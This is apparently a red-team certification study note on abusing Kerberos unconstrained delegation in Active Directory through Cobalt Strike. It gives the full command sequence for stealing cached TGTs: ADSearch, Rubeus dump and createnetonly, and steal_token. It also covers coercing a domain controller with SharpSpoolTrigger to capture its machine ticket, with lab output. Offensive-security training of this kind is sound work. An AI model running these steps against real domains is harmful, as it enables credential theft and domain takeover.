
Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.  The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.  If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

## 🖊️ via Cobalt Strike

#### 📔 Obtain user's account TGT

Obtain a User's TGT for unconstrained delegation

1) From a SYSTEM beacon, look for computers with unconstrained delegation enabled

`beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname`

Domain Controllers always have this feature enabled.

2) If your local beacon machine has it, we can now try to check if any local TGTs interact with any of those machines other machines. List your local TGTs (look for krbtgt):

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`

3) Analyze the tickets displayed, one of those could be related/interacting with one of the machines you want access into (maybe the DC). 
4) If you identify one potential candidate, dump it, then create a new process locally using the ticket:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
	
doIFwj [...snip...] MuSU8=

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

[*] Using DEV\nlamb:FakePass

[*] Showing process : False
[*] Username        : nlamb
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1540
[+] Ticket successfully imported!
[+] LUID            : 0x3206fb
```

The locally created process will have the integrity of the ticket, which should give us access into the remote machine now.

5) [[Steal the token]] of the process:
`beacon> steal_token 1540`

6) Test access into the machine with something like:
`beacon> ls \\dc-2.dev.cyberbotic.io\c$`


#### 📔 Obtain machine's account TGT

You could try to force the remote machine to log into ours, monitor for any new [[Ticket Granting Ticket (TGT)]] newly cached, and use them:

1) Monitor for tickets

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```

2) Run SharpSpoolTrigger, this will force the authentication

`beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io`

Where:

- DC-2 is the "target".
- WEB is the "listener" (your current beacon location)

3) Rubeus will then capture the ticket.

```
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```

4) With the ticket, since it's a machine account's TGT we have to use [[S4U2Self Abuse]] .



### ⚠ Opsec




### Properties
---
📆 created   {{18-02-2024}} 19:17
🏷️ tags: #redteam #crto 

---

